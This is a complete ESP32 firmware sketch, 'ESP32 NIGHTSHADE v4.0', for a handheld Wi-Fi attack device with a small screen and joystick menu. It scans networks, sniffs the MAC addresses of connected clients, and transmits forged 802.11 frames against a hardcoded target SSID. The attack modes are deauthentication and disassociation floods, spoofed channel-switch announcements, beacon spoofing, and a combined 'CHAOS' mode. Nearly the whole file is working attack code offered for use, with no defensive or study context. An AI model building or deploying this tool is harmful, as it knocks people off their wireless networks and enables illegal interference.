/*
 * ESP32 NIGHTSHADE — v4.0
 */

#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7735.h>
#include <WiFi.h>
#include "esp_wifi.h"

#define TFT_CS 5
#define TFT_RST 17
#define TFT_DC 16
#define JOY_VRX 34
#define JOY_VRY 35
#define JOY_SW 32

#define TARGET_SSID "F307"
#define MAX_NETWORKS 25
#define MAX_CLIENTS 40
#define CLIENT_TIMEOUT 25000UL

Adafruit_ST7735 tft = Adafruit_ST7735(TFT_CS, TFT_DC, TFT_RST);
const int OX=1, OY=0;

// ====================== COLOR PALETTE ======================
#define BLACK        0x0000
#define LBLUE        0x35ff
#define GREEN        0x0770
#define AQUA         0x05f8
#define RED          0xf800
#define MAGENTA      0xd01f
#define YELLOW       0xf7e0
#define WHITE        0xf7be
#define GRAY         0xbdd7
#define BLUE         0x001f
#define LGREEN       0x4fe9
#define LAQUA        0x07ff
#define LRED         0xf800
#define LMAGENTA     0xd01f
#define LYELLOW      0xffc0
#define BRIGHTWHITE  0xFFFF
#define PURPLE       0x881f
#define ORANGE       0xfc60
#define PINK         0xf818

struct Network { String ssid; uint8_t bssid[6]; int channel; int rssi; };
struct ClientEntry { uint8_t mac[6]; unsigned long lastSeen; };

Network networks[MAX_NETWORKS];
ClientEntry clients[MAX_CLIENTS];

int numNetworks=0, numClients=0, selectedIndex=0;
int detailPage=0, detailOption=0;
bool inDetails=false, viewingClients=false;
int clientScroll=0;

volatile bool sniffing=false, attacking=false;
volatile uint8_t attackMode=0;
bool isBroadcastMode=false;
uint32_t packetCount=0;

uint8_t targetBSSID[6]={0};
int targetChannel=1;

portMUX_TYPE clientMux = portMUX_INITIALIZER_UNLOCKED;
TaskHandle_t attackTaskHandle = NULL;

const uint8_t REASON_CODES[6]={0x01,0x02,0x03,0x04,0x07,0x08};

void drawNetworkList(); void drawClientList(); void drawDetails();

// ====================== FRAME BUILDERS ======================
void buildDeauth(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint8_t r, uint16_t s) {
  b[0]=0xC0; b[1]=0x00; b[2]=0x00; b[3]=0x00;
  memcpy(&b[4],c,6); memcpy(&b[10],ap,6); memcpy(&b[16],ap,6);
  uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF; b[24]=r; b[25]=0;
}
void buildDisassoc(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint8_t r, uint16_t s) {
  b[0]=0xA0; b[1]=0x00; b[2]=0x00; b[3]=0x00;
  memcpy(&b[4],c,6); memcpy(&b[10],ap,6); memcpy(&b[16],ap,6);
  uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF; b[24]=r; b[25]=0;
}
void buildCSA(uint8_t* b, const uint8_t* ap, uint8_t ch, uint8_t cnt, uint16_t s) {
  b[0]=0xD0; b[1]=0x00; b[2]=0x00; b[3]=0x00;
  memcpy(&b[4],(uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",6);
  memcpy(&b[10],ap,6); memcpy(&b[16],ap,6);
  uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF;
  b[24]=0x0A; b[25]=0x04; b[26]=0x01; b[27]=ch; b[28]=cnt;
}
void buildQoSNull(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint16_t s) {
  b[0]=0x48; b[1]=0x01; b[2]=0x00; b[3]=0x00;
  memcpy(&b[4],c,6); memcpy(&b[10],ap,6); memcpy(&b[16],ap,6);
  uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF; b[24]=0; b[25]=0;
}
void buildBeacon(uint8_t* b, const uint8_t* ap, uint16_t s) {
  b[0]=0x80; b[1]=0x00; b[2]=0x00; b[3]=0x00;
  memcpy(&b[4],(uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",6);
  memcpy(&b[10],ap,6); memcpy(&b[16],ap,6);
  uint16_t sc=(s&0xFFF)<<4; b[22]=sc&0xFF; b[23]=(sc>>8)&0xFF;
  memset(&b[24],0,12); b[36]=0x64; b[37]=0; b[38]=1; b[39]=0;
  b[40]=0; b[41]=5; memcpy(&b[42],"F307",5);
}

// ====================== CLIENT MGMT ======================
bool validMAC(const uint8_t* m) {
  static const uint8_t nullMAC[6] = {0};
  if (memcmp(m, nullMAC, 6) == 0) return false;
  if ((m[0] & 1) == 1) return false;
  return true;
}

void addClient(const uint8_t* mac) {
  if (!validMAC(mac)) return;
  portENTER_CRITICAL(&clientMux);
  for (int i=0; i<numClients; i++) {
    if (memcmp(clients[i].mac, mac, 6)==0) {
      clients[i].lastSeen = millis();
      portEXIT_CRITICAL(&clientMux);
      return;
    }
  }
  if (numClients < MAX_CLIENTS) {
    memcpy(clients[numClients].mac, mac, 6);
    clients[numClients].lastSeen = millis();
    numClients++;
  }
  portEXIT_CRITICAL(&clientMux);
}

void cleanupStaleClients() {
  portENTER_CRITICAL(&clientMux);
  unsigned long now = millis(); int j=0;
  for (int i=0; i<numClients; i++) if (now - clients[i].lastSeen < CLIENT_TIMEOUT) {
    if (j != i) memcpy(&clients[j], &clients[i], sizeof(ClientEntry));
    j++;
  }
  numClients = j;
  portEXIT_CRITICAL(&clientMux);
}

// ====================== SNIFFER ======================
void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!sniffing && !attacking) return;
  wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
  if (raw->rx_ctrl.sig_len < 24) return;

  uint8_t* p = raw->payload;
  uint16_t fc = *(uint16_t*)p;
  uint8_t ft = (fc & 0x000C) >> 2;
  uint8_t subtype = (fc & 0x00F0) >> 4;

  if (ft == 0x02) {
    bool toDS   = (fc >> 8) & 1;
    bool fromDS = (fc >> 9) & 1;
    if (toDS && !fromDS && memcmp(&p[4], targetBSSID, 6) == 0)
      addClient(&p[10]);
    else if (!toDS && fromDS && memcmp(&p[10], targetBSSID, 6) == 0)
      addClient(&p[4]);
  }
  else if (ft == 0x00 && memcmp(&p[16], targetBSSID, 6) == 0) {
    if (subtype == 0x00 || subtype == 0x02 || subtype == 0x0B ||
        subtype == 0x05 || subtype == 0x0A || subtype == 0x0C) {
      if (memcmp(&p[10], targetBSSID, 6) != 0)
        addClient(&p[10]);
    }
  }
}

// ====================== ATTACK TASK ======================
void attackTask(void *pv) {
  uint8_t buf[128]; uint32_t seq=0; uint8_t rIdx=0; unsigned long lc=0;
  uint8_t safeMacs[5][6];

  while(true) {
    if(!attacking){vTaskDelay(100/portTICK_PERIOD_MS); continue;}
    esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);

    portENTER_CRITICAL(&clientMux);
    int snap = numClients;
    int copyCnt = min(5, snap);
    for(int i=0; i<copyCnt; i++) memcpy(safeMacs[i], clients[i].mac, 6);
    portEXIT_CRITICAL(&clientMux);

    uint8_t reason = REASON_CODES[rIdx%6];

    if(attackMode==1||attackMode==4){
      uint8_t t[6];
      if(snap > 0 && !isBroadcastMode) memcpy(t, safeMacs[0], 6);
      else memcpy(t, (uint8_t*)"\xFF\xFF\xFF\xFF\xFF\xFF",6);
      for(int i=0;i<5;i++){
        buildDeauth(buf,targetBSSID,t,reason,seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,26,false);
        buildDisassoc(buf,targetBSSID,t,reason,seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,26,false);
      }
    }
    if(attackMode==2||attackMode==4) for(int i=0;i<6;i++){uint8_t ch=((targetChannel+i)%11)+1; buildCSA(buf,targetBSSID,ch,4,seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,29,false);}
    if(attackMode==3||attackMode==4) for(int i=0;i<5;i++){buildBeacon(buf,targetBSSID,seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,60,false);}
    if(snap>0&&(attackMode==1||attackMode==4)) for(int c=0;c<min(4,snap);c++){buildQoSNull(buf,targetBSSID,safeMacs[c],seq++); esp_wifi_80211_tx(WIFI_IF_STA,buf,26,false);}

    packetCount=seq; rIdx++;
    if(millis()-lc>2000){cleanupStaleClients(); lc=millis();}
    vTaskDelay(7/portTICK_PERIOD_MS);
  }
}

// ====================== UI ======================

void drawHeader(){
  tft.fillScreen(BLACK);
  tft.setTextSize(1);
  tft.setCursor(4+OX, 6+OY);
  tft.setTextColor(RED);        // "ESP32 NIGHTSHADE" in RED
  tft.print("ESP32 NIGHTSHADE ");
  tft.setTextColor(WHITE);      // "v4.0" in WHITE
  tft.print("v4.0");
  tft.drawLine(0, 18+OY, 160, 18+OY, GRAY);
}

void drawClientCount(){
  tft.fillRect(110,22+OY,50,40,BLACK);
  tft.setCursor(115+OX,25+OY);
  tft.setTextColor(LGREEN);     // client count in LGREEN
  tft.print("C:"); tft.print(numClients);
  tft.setCursor(115+OX,36+OY);
  tft.setTextColor(WHITE);
  tft.print("P:"); tft.print(packetCount%10000);
}

void drawClientList(){
  tft.fillRect(0,25+OY,160,110,BLACK);
  tft.setCursor(5+OX,28+OY);
  tft.setTextColor(AQUA);
  tft.print("CONNECTED CLIENTS");
  drawClientCount();
  portENTER_CRITICAL(&clientMux); int c=numClients; portEXIT_CRITICAL(&clientMux);
  tft.setTextColor(WHITE);
  for(int i=0;i<7;i++){
    int idx=clientScroll+i; if(idx>=c) break;
    tft.setCursor(8+OX,42+i*11+OY);
    tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
      clients[idx].mac[0],clients[idx].mac[1],clients[idx].mac[2],
      clients[idx].mac[3],clients[idx].mac[4],clients[idx].mac[5]);
  }
}

void drawDetails(){
  if(viewingClients){ drawClientList(); return; }
  drawHeader();
  Network& n = networks[selectedIndex];

  tft.setCursor(5+OX,25+OY);
  tft.setTextColor(WHITE);      // "NETWORK DETAILS" in WHITE
  tft.print("NETWORK DETAILS");

  tft.setCursor(5+OX,37+OY);
  tft.setTextColor(WHITE); tft.print("SSID: ");
  tft.setTextColor(LGREEN);     // SSID name in LGREEN
  String s=n.ssid; if(s.length()>12) s=s.substring(0,12);
  tft.print(s);

  tft.setCursor(5+OX,48+OY);
  tft.setTextColor(PURPLE);     // channel in PURPLE
  tft.print("Ch:"); tft.print(n.channel);
  tft.print("   ");
  tft.setTextColor(BLUE);       // RSSI in BLUE
  tft.print("RSSI:"); tft.print(n.rssi);

  tft.setCursor(5+OX,59+OY);
  tft.setTextColor(LAQUA);      // MAC in CYAN
  tft.printf("%02X:%02X:%02X:%02X:%02X:%02X",
    n.bssid[0],n.bssid[1],n.bssid[2],n.bssid[3],n.bssid[4],n.bssid[5]);

  tft.drawLine(0,70+OY,160,70+OY,GRAY);

  tft.setCursor(5+OX,74+OY);
  tft.setTextColor(PINK);       // page number in PINK
  tft.print(detailPage==0 ? "PAGE 1 / 2" : "PAGE 2 / 2");

  const char* opt[7] = {"SNIFF","DEAUTH","CSA","BEACON SPAM","CHAOS","CLIENTS","BACK"};
  bool act[5] = {sniffing&&!attacking, attackMode==1, attackMode==2, attackMode==3, attackMode==4};

  int start = (detailPage == 0) ? 0 : 4;
  int count = (detailPage == 0) ? 4 : 3;

  for(int i=0; i<count; i++){
    int idx = start + i;
    tft.setCursor(5+OX, 88 + i*11 + OY);
    if(idx == detailOption){
      tft.setTextColor(LGREEN);  // cursor AND selected text in LGREEN
      tft.print(">> ");
      tft.print(opt[idx]);
    } else {
      tft.setTextColor(YELLOW);  // unselected options in YELLOW
      tft.print("   ");
      tft.print(opt[idx]);
    }
    if(idx < 5 && act[idx]){
      tft.setTextColor(ORANGE);  // exclamation in ORANGE
      tft.print(" !");
    }
  }

  tft.setTextColor(PINK);        // page indicator in PINK
  tft.setCursor(125+OX,118+OY);
  tft.print(detailPage+1); tft.print("/2");

  if(sniffing||attacking) drawClientCount();
}

void drawNetworkList(){
  drawHeader();
  tft.setCursor(5+OX,28+OY);
  for(int i=0;i<5&&(selectedIndex+i)<numNetworks;i++){
    int idx=selectedIndex+i;
    if(i==0){
      tft.setTextColor(WHITE);   // selected cursor in WHITE
      tft.print(" >> ");
    } else {
      tft.setTextColor(YELLOW);  // unselected indent
      tft.print("    ");
    }
    tft.setTextColor(YELLOW);    // ALL SSIDs in YELLOW
    String s=networks[idx].ssid; if(s.length()>16) s=s.substring(0,16);
    tft.println(s);              // no RSSI
  }
  tft.setTextColor(GRAY);
  tft.setCursor(5+OX,118+OY); tft.printf("%d/%d",selectedIndex+1,numNetworks);
}

void scanNetworks(){
  drawHeader();
  tft.setCursor(8+OX,28+OY); tft.setTextColor(LBLUE); tft.print("Scanning...");
  numNetworks=0; int n=WiFi.scanNetworks(false,true);
  for(int i=0;i<n&&numNetworks<MAX_NETWORKS;i++) if(WiFi.SSID(i).length()>0){
    networks[numNetworks].ssid=WiFi.SSID(i);
    memcpy(networks[numNetworks].bssid,WiFi.BSSID(i),6);
    networks[numNetworks].channel=WiFi.channel(i);
    networks[numNetworks].rssi=WiFi.RSSI(i);
    numNetworks++;
  }
  selectedIndex=0; drawNetworkList();
}

void startSniff(){
  if(networks[selectedIndex].ssid != TARGET_SSID) return;
  memcpy(targetBSSID,networks[selectedIndex].bssid,6);
  targetChannel=networks[selectedIndex].channel;
  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);
  sniffing=true; attacking=false; numClients=0;
}

void startAttack(uint8_t m){
  if(networks[selectedIndex].ssid != TARGET_SSID) return;
  memcpy(targetBSSID,networks[selectedIndex].bssid,6);
  targetChannel=networks[selectedIndex].channel;
  esp_wifi_set_channel(targetChannel,WIFI_SECOND_CHAN_NONE);
  attackMode=m; attacking=true; sniffing=true; isBroadcastMode=(m==1);
}

void stopAll(){ attacking=false; sniffing=false; attackMode=0; }

void handleJoystick(){
  int y=analogRead(JOY_VRY); bool p=digitalRead(JOY_SW)==LOW;
  if(p){
    delay(180);
    if(viewingClients){ viewingClients=false; drawDetails(); return; }

    if(inDetails){
      if(detailOption==0 && sniffing && !attacking){ stopAll(); drawDetails(); return; }
      if(detailOption==1 && attackMode==1){ stopAll(); drawDetails(); return; }
      if(detailOption==2 && attackMode==2){ stopAll(); drawDetails(); return; }
      if(detailOption==3 && attackMode==3){ stopAll(); drawDetails(); return; }
      if(detailOption==4 && attackMode==4){ stopAll(); drawDetails(); return; }

      if(detailOption==0){ stopAll(); startSniff(); }
      else if(detailOption==1){ stopAll(); startAttack(1); }
      else if(detailOption==2){ stopAll(); startAttack(2); }
      else if(detailOption==3){ stopAll(); startAttack(3); }
      else if(detailOption==4){ stopAll(); startAttack(4); }
      else if(detailOption==5){ viewingClients=true; clientScroll=0; }
      else { stopAll(); inDetails=false; viewingClients=false; drawNetworkList(); return; }
      drawDetails();
    } else {
      inDetails=true; detailPage=0; detailOption=0; viewingClients=false; drawDetails();
    }
    return;
  }

  if(viewingClients){
    if(y<1400&&clientScroll>0){ clientScroll--; drawClientList(); delay(80); }
    else if(y>2600&&clientScroll<numClients-7){ clientScroll++; drawClientList(); delay(80); }
    return;
  }

  if(!inDetails){
    if(y<1400&&selectedIndex>0){ selectedIndex--; drawNetworkList(); delay(130); }
    else if(y>2600&&selectedIndex<numNetworks-1){ selectedIndex++; drawNetworkList(); delay(130); }
  } else {
    int oldPage = detailPage;
    int oldOpt  = detailOption;

    if(y<1400){
      if(detailOption > (detailPage*4)) detailOption--;
      else if(detailPage > 0){ detailPage--; detailOption = detailPage*4 + 3; }
    }
    else if(y>2600){
      int maxOptThisPage = (detailPage==0) ? 3 : 6;
      if(detailOption < maxOptThisPage) detailOption++;
      else if(detailPage == 0){ detailPage=1; detailOption=4; }
    }

    if(oldPage != detailPage || oldOpt != detailOption) drawDetails();
    delay(110);
  }
}

void setup(){
  Serial.begin(115200); pinMode(JOY_SW,INPUT_PULLUP);
  tft.initR(INITR_BLACKTAB); tft.setRotation(3);
  tft.fillScreen(BLACK);
  WiFi.mode(WIFI_STA); WiFi.disconnect();
  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_max_tx_power(WIFI_POWER_19_5dBm);
  xTaskCreatePinnedToCore(attackTask,"Attack",16384,NULL,1,&attackTaskHandle,0);
  scanNetworks();
}

void loop(){
  handleJoystick();
  if(sniffing||attacking){ drawClientCount(); delay(70); }
  else delay(60);
}